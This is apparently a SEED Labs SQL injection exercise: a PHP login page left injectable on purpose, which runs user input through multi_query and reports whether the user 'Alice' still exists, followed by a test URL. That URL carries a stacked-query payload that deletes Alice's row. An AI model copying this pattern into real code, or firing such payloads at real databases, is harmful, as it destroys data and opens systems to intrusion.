<?php
session_start();

// Get input
$input_uname = $_GET['username'];
$input_pwd = $_GET['Password'];
$hashed_pwd = sha1($input_pwd);

// Database connection
function getDB() {
    $dbhost="10.9.0.6";
    $dbuser="seed";
    $dbpass="dees";
    $dbname="sqllab_users";
    $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    return $conn;
}

$conn = getDB();

// Build SQL
$sql = "SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password
FROM credential
WHERE name= '$input_uname' and Password='$hashed_pwd'";

// DEBUG OUTPUT
echo "<h2>DEBUG INFO</h2>";
echo "<h3>SQL Query:</h3>";
echo "<pre>" . htmlspecialchars($sql) . "</pre>";
echo "<hr>";

// Execute multi_query
echo "<h3>Executing multi_query...</h3>";
if ($conn->multi_query($sql)) {
    echo "✓ multi_query() returned TRUE<br>";
    
    $resultNum = 0;
    do {
        $resultNum++;
        echo "<br><b>Processing result set #$resultNum</b><br>";
        
        if ($result = $conn->store_result()) {
            echo "- Got result set with " . $result->num_rows . " rows<br>";
            $result->free();
        } else {
            echo "- No result set (this is normal for DELETE/UPDATE/INSERT)<br>";
            if ($conn->errno) {
                echo "- ERROR: " . $conn->error . "<br>";
            } else {
                echo "- Affected rows: " . $conn->affected_rows . "<br>";
            }
        }
        
        if ($conn->more_results()) {
            echo "- More results available, calling next_result()...<br>";
        }
        
    } while ($conn->more_results() && $conn->next_result());
    
    echo "<br><b>✓ Finished processing all result sets</b><br>";
} else {
    echo "✗ multi_query() returned FALSE<br>";
    echo "ERROR: " . $conn->error . "<br>";
}

echo "<hr>";
echo "<h3>Check if Alice still exists:</h3>";
$checkSql = "SELECT name FROM credential WHERE name='Alice'";
if ($checkResult = $conn->query($checkSql)) {
    if ($checkResult->num_rows > 0) {
        echo "❌ Alice STILL EXISTS in database<br>";
    } else {
        echo "✅ Alice has been DELETED from database<br>";
    }
    $checkResult->free();
}

$conn->close();
?>
```

## Step 2: Test with Debug

Save this as unsafe_home.php, restart containers, then visit:
```
http://www.seed-server.com/unsafe_home.php?username=admin';DELETE FROM credential WHERE name='Alice'%23&Password=test
